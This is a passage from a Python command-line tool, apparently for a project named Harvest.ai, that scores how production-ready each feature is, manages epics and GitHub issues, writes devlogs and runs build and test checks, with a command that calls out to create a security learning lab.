                production_ready += 1
                print("  Status: ✅ PRODUCTION READY")
            else:
                print("  Status: ⚠️ NEEDS WORK")
                
                if depth['gaps']:
                    print("  Gaps:")
                    for gap in depth['gaps']:
                        print(f"    - {gap}")
                
                if depth['next_steps']:
                    print("  Next Step:")
                    print(f"    → {depth['next_steps'][0]}")
        
        # Calculate score
        score = (production_ready / total_features) * 100
        
        print("\n" + "="*60)
        print(f"📊 PRODUCTION READINESS: {score:.1f}%")
        print(f"   {production_ready}/{total_features} features at production depth")
        
        if score < 50:
            print("\n❌ VERDICT: Too much documentation, not enough implementation")
            print("   Per AGENT_BOOT: 'This Is Not Documentation. This Is Implementation.'")
        elif score < 80:
            print("\n⚠️ VERDICT: Making progress but still shallow")
            print("   Focus on depth, not breadth")
        else:
            print("\n✅ VERDICT: Achieving AGENT_BOOT standards!")
            print("   Production-grade educational simulator")
        
        print("="*60 + "\n")
        
        # Force documentation update if needed
        if self.manager.tracking.must_update():
            print("📝 Updating documentation (tracking enforcement)...")
            await self.manager.update_documentation()
    
    async def implement_next_priority(self):
        """
        Implement the next highest priority item.
        This drives toward production depth, not feature breadth.
        """
        print("\n🎯 IMPLEMENTING NEXT PRIORITY")
        
        # Find shallowest feature
        shallowest = None
        min_depth = FeatureDepth.PRODUCTION
        
        for feature in HarvestFeature:
            depth = await self.manager.check_feature_depth(feature)
            
            # Map depth descriptions to enum values
            depth_desc = depth['current_depth']
            if 'Just UI' in depth_desc:
                current = FeatureDepth.SHALLOW
            elif 'Has documentation' in depth_desc:
                current = FeatureDepth.DOCUMENTED
            elif 'Has MSW mocks' in depth_desc:
                current = FeatureDepth.MOCKED
            elif 'Basic functionality' in depth_desc:
                current = FeatureDepth.IMPLEMENTED
            elif 'Industry patterns' in depth_desc:
                current = FeatureDepth.PRODUCTION
            else:
                current = FeatureDepth.SHALLOW
            
            if current.value < min_depth.value:
                min_depth = current
                shallowest = (feature, depth)
        
        if shallowest:
            feature, depth = shallowest
            print(f"\nTarget: {feature.name}")
            print(f"Current: {depth['current_depth']}")
            
            if depth['next_steps']:
                next_step = depth['next_steps'][0]
                print(f"Action: {next_step}")
                
                # Implement specific patterns
                if "circuit breaker" in next_step.lower():
                    result = await self.manager.implement_production_pattern("circuit_breaker")
                    if result['implemented']:
                        print(f"✅ Implemented circuit breaker pattern")
                        print(f"   Files created: {', '.join(result['files_created'])}")
                
                # Track the implementation
                self.manager.tracking.track_change(
                    'feature_implementation',
                    f"Advanced {feature.name} implementation",
                    feature=feature.name,
                    action=next_step
                )
        
        # Update documentation
        if self.manager.tracking.must_update():
            await self.manager.update_documentation()
    
    async def create_learning_lab(self, lab_type: str = "security"):
        """
        Create an interactive learning lab.
        These are breakable, explorable systems that teach by doing.
        """
        print(f"\n🔬 CREATING LEARNING LAB: {lab_type}")
        
        if lab_type == "security":
            result = await self.lab_creator.create_security_lab()
            if result['created']:
                print(f"✅ Security lab created at: {result['path']}")
                print(f"   Components: {', '.join(result['components'])}")
                print("\n📚 Learning objectives:")
                print("   1. Break the vulnerable component")
                print("   2. Understand the vulnerability")
                print("   3. Study the secure implementation")
                print("   4. Test your understanding")
        
        # Track creation
        self.manager.tracking.track_change(
            'lab_creation',
            f"Created {lab_type} learning lab",
            lab_type=lab_type
        )
        
        # Update documentation
        if self.manager.tracking.must_update():
            await self.manager.update_documentation()
    
    async def run_production_checks(self):
        """
        Run all production readiness checks.
        This enforces AGENT_BOOT standards.
        """
        print("\n🏭 RUNNING PRODUCTION CHECKS")
        
        checks = {
            'Build': await self.manager._check_build(),
            'TypeScript': await self.manager._check_typescript(),
            'Tests': (await self.manager.run_tests())['passed'],
            'Documentation': (self.manager.docs_path / "status" / "DEVLOG.md").exists()
        }
        
        print("\nResults:")
        for check, passed in checks.items():
            status = "✅" if passed else "❌"
            print(f"  {status} {check}")
        
        if all(checks.values()):
            print("\n✅ All production checks passed!")
        else:
            print("\n❌ Production checks failed")
            print("   Per AGENT_BOOT: Ship production-ready, not prototype")

# ============================================================================
# CLI INTERFACE
# ============================================================================

async def main():
    """Main entry point with ENHANCED commands"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Harvest.ai Agent Boot - Production-Grade Educational Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
ENHANCED COMMANDS:

Core Commands:
  analyze         - Analyze implementation depth
  implement       - Implement next priority pattern
  lab            - Create learning lab
  check          - Run production checks

Epics Management:
  epic-create    - Create new epic with tasks
  epic-update    - Update epic progress
  epic-list      - List all epics with status

GitHub Integration:
  issue-create   - Create GitHub issue from epic
  issue-list     - List GitHub issues

Progress Tracking:
  progress       - Show visual progress report
  report         - Generate comprehensive report

Documentation:
  update-docs    - Force update all documentation
  log-session    - Write session to DEVLOG

Examples:
  python agent_boot.py analyze
  python agent_boot.py epic-create --title "Add Circuit Breakers" --tasks "Implement pattern,Add tests,Update docs"
  python agent_boot.py issue-create --epic A
  python agent_boot.py progress
        """
    )
    
    parser.add_argument('command', choices=[
        'analyze', 'implement', 'lab', 'check',
        'epic-create', 'epic-update', 'epic-list',
        'issue-create', 'issue-list',
        'progress', 'report',
        'update-docs', 'log-session'
    ], help='Command to execute')
    
    # Optional arguments
    parser.add_argument('--lab-type', default='security',
                       help='Type of lab to create')
    parser.add_argument('--title', help='Title for epic or issue')
    parser.add_argument('--tasks', help='Comma-separated tasks for epic')
    parser.add_argument('--epic', help='Epic ID (A, B, C, etc.)')
    parser.add_argument('--progress', type=int, help='Progress percentage')
    parser.add_argument('--summary', help='Session summary for devlog')
    
    args = parser.parse_args()
    
    try:
        agent = HarvestAgentBoot()
        
        # Core commands
        if args.command == 'analyze':
            await agent.devlog.log_action("Analyzing project depth")
            await agent.analyze_project_depth()
            await agent.devlog.write_session_log("Project depth analysis completed")
        
        elif args.command == 'implement':
            await agent.devlog.log_action("Implementing next priority")
            await agent.implement_next_priority()
            await agent.devlog.write_session_log("Pattern implementation completed")
        
        elif args.command == 'lab':
            await agent.devlog.log_action(f"Creating {args.lab_type} lab")
            await agent.create_learning_lab(args.lab_type)
            await agent.devlog.write_session_log(f"{args.lab_type} lab created")
        
        elif args.command == 'check':
            await agent.devlog.log_action("Running production checks")
            await agent.run_production_checks()
            await agent.devlog.write_session_log("Production checks completed")
        
        # Epic management
        elif args.command == 'epic-create':
            if not args.title:
                print("❌ Error: --title required for epic-create")
                sys.exit(1)
            
            tasks = args.tasks.split(',') if args.tasks else []
            epic_id = await agent.epics.create_epic(args.title, tasks)
            print(f"✅ Created Epic {epic_id}: {args.title}")
            await agent.devlog.log_action(f"Created Epic {epic_id}", {'title': args.title})
            await agent.devlog.write_session_log(f"Epic {epic_id} created")
        
        elif args.command == 'epic-update':
            if not args.epic:
                print("❌ Error: --epic required for epic-update")
                sys.exit(1)
            
            success = await agent.epics.update_epic_progress(args.epic, args.progress)
            if success:
                print(f"✅ Updated Epic {args.epic}")
                await agent.devlog.log_action(f"Updated Epic {args.epic}", {'progress': args.progress})
            else:
                print(f"❌ Failed to update Epic {args.epic}")
        
        elif args.command == 'epic-list':
            print("\n📋 EPICS STATUS:\n" + "="*50)
            for epic_id, epic in sorted(agent.epics.epics.items()):
                icon = "✅" if epic['status'] == 'DONE' else "🔄" if epic['status'] == 'IN_PROGRESS' else "📝"
                print(f"\n{icon} Epic {epic_id}: {epic['title']}")
                print(f"   Status: {epic['status']}")
                print(f"   Progress: {agent.progress.create_progress_bar(epic['progress'])}")
                if epic['tasks']:
                    completed = sum(1 for t in epic['tasks'] if t['completed'])
                    print(f"   Tasks: {completed}/{len(epic['tasks'])} completed")
        
        # GitHub integration
        elif args.command == 'issue-create':
            if not agent.github.gh_available:
                print("❌ GitHub CLI not available. Run: gh auth login")
                sys.exit(1)
            
            if args.epic and args.epic in agent.epics.epics:
                epic = agent.epics.epics[args.epic]
                title = f"Epic {args.epic}: {epic['title']}"
                body = f"Progress: {epic['progress']}%\n\nTasks:\n"
                for task in epic['tasks']:
                    checkbox = "[x]" if task['completed'] else "[ ]"
                    body += f"- {checkbox} {task['text']}\n"
            elif args.title:
                title = args.title
                body = "Created by Agent Boot"
            else:
                print("❌ Error: --epic or --title required for issue-create")
                sys.exit(1)
            
            result = await agent.github.create_issue(title, body, ['agent-boot'])
            if result['success']:
                print(f"✅ Created issue #{result['issue_number']}: {result['url']}")
                await agent.devlog.log_action(f"Created GitHub issue #{result['issue_number']}")
            else:
                print(f"❌ Failed: {result['error']}")
        
        elif args.command == 'issue-list':
            issues = await agent.github.list_issues()
            print(f"\n📋 GitHub Issues ({len(issues)} open):\n" + "="*50)
            for issue in issues:
                labels = ', '.join([l['name'] for l in issue.get('labels', [])])
                print(f"\n#{issue['number']}: {issue['title']}")
                if labels:
                    print(f"   Labels: {labels}")
        
        # Progress tracking
        elif args.command == 'progress':
            # Gather feature data
            features = {}
            for feature in HarvestFeature:
                depth_info = await agent.manager.check_feature_depth(feature)
                depth_name = depth_info['current_depth'].split()[0].upper()
                if depth_name == 'JUST':
                    depth_name = 'SHALLOW'
                elif depth_name == 'HAS':
                    depth_name = 'MOCKED'
                elif depth_name == 'BASIC':
                    depth_name = 'IMPLEMENTED'
                elif depth_name == 'INDUSTRY':
                    depth_name = 'PRODUCTION'
                
                # Calculate progress based on depth
                progress_map = {
                    'SHALLOW': 0,
                    'DOCUMENTED': 10,
                    'MOCKED': 30,
                    'IMPLEMENTED': 60,
                    'PRODUCTION': 100
                }
                
                features[feature.name] = {
                    'depth': depth_name,
                    'progress': progress_map.get(depth_name, 0),
                    'next_step': depth_info['next_steps'][0] if depth_info['next_steps'] else None
                }
            
            # Generate and display report
            report = agent.progress.generate_progress_report(features)
            print(report)
            
            # Save metrics
            agent.progress.save_metrics()
        
        elif args.command == 'report':
            print("\n📊 COMPREHENSIVE REPORT\n" + "="*60)
            
            # Project metrics
            test_results = await agent.manager.run_tests()
            print("\n🏗️ Build Status:")
            print(f"   Build: {'✅ Passing' if await agent.manager._check_build() else '❌ Failing'}")
            print(f"   Tests: {'✅ Passing' if test_results['passed'] else '❌ Failing'}")
            print(f"   TypeScript: {'✅ Clean' if await agent.manager._check_typescript() else '❌ Errors'}")
            
            if test_results.get('coverage'):
                print("\n📈 Test Coverage:")
                for metric, value in test_results['coverage'].items():
                    print(f"   {metric.capitalize()}: {value}%")
            
            # Epic status
            print("\n📋 Epics Summary:")
            total_epics = len(agent.epics.epics)
            done_epics = sum(1 for e in agent.epics.epics.values() if e['status'] == 'DONE')
            print(f"   Total: {total_epics}")
            print(f"   Completed: {done_epics}")
            print(f"   In Progress: {sum(1 for e in agent.epics.epics.values() if e['status'] == 'IN_PROGRESS')}")
            
            # GitHub status
            if agent.github.gh_available:
                issues = await agent.github.list_issues()
                print(f"\n🐙 GitHub:")
                print(f"   Open Issues: {len(issues)}")
            
            print("\n" + "="*60)
        
        # Documentation
        elif args.command == 'update-docs':
            print("📝 Updating all documentation...")
            await agent.manager.update_documentation()
            await agent.epics._save_epics()
            await agent.devlog.write_session_log(args.summary or "Documentation update")
            print("✅ Documentation updated")
        
        elif args.command == 'log-session':
            summary = args.summary or "Manual session log"
            await agent.devlog.write_session_log(summary)
            print(f"✅ Session logged: {summary}")
        
    except Exception as e:
        logger.error(f"Command failed: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())
